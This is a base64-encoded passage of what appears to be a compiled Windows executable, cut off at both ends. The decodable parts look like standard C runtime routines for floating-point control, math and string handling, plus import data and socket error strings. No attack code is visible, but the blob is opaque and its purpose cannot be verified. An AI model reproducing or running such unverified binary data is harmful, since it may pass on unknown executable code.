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FDLtg/gCdAL21dnJ2eHroOnrAgAA6akDAADd2N3Y2y0Q80EAxoVw////AsPZ7dnJ2eSb3b1g////m/aFYf///0F10tnxw8aFcP///wLd2NstGvNBAMMKyXVTw9ns6wLZ7dnJCsl1rtnxw+mRAgAA6M8AAADd2N3YCsl1Dtnug/gBdQYK7XQC2eDDxoVw////AtstEPNBAIP4AXXtCu106dng6+Xd2OlCAgAA3djpEwMAAFjZ5JvdvWD///+b9oVh////AXUP3djbLRDzQQAK7XQC2eDDxoVw////BOkMAgAA3djd2NstEPNBAMaFcP///wPDCsl1r93Y2y0Q80EAw9nA2eHbLS7zQQDe2ZvdvWD///+b9oVh////QXWV2cDZ/Nnkm929YP///5uKlWH////Zydjh2eSb3b1g////2eHZ8MPZwNn82Nmb3+CedRrZwNwNQvNBANnA2fze2Zvf4J50DbgBAAAAw7gAAAAA6/i4AgAAAOvxVoPsdIv0VoPsCN0cJIPsCN0cJJvddgjo2QcAAIPEFN1mCN0Gg8R0XoXAdAXpLgIAAMPMzMzMzMzMzMzMgHoOBXURZoudXP///4DPAoDn/rM/6wRmuz8TZomdXv///9mtXv///7ue80EA2eWJlWz///+b3b1g////xoVw////AJuKjWH////Q4dD50MGKwSQP1w++wIHhBAQAAIvaA9iDwxBQUlGLC/8VwJFBAFlaWP8jgHoOBXURZoudXP///4DPAoDn/rM/6wRmuz8TZomdXv///9mtXv///7ue80EA2eWJlWz///+b3b1g////xoVw////ANnJio1h////2eWb3b1g////2cmKrWH////Q5dD90MWKxSQP14rg0OHQ+dDBisEkD9fQ5NDkCsQPvsCB4QQEAACL2gPYg8MQUFJRiwv/FcCRQQBZWlj/I+gPAQAA2cmNpCQAAAAAjUkA3diNpCQAAAAAjaQkAAAAAMPo7QAAAOvo3djd2Nnuw5Dd2N3Y2e6E7XQC2eDD3diQ3djZ6MONpCQAAAAAjWQkANu9Yv///9utYv////aFaf///0B0CMaFcP///wDDxoVw////ANwFjvNBAMPrA8zMzNnJjaQkAAAAAI2kJAAAAADbvWL////brWL////2hWn///9AdAnGhXD///8A6wfGhXD///8A3sHDjaQkAAAAAJDb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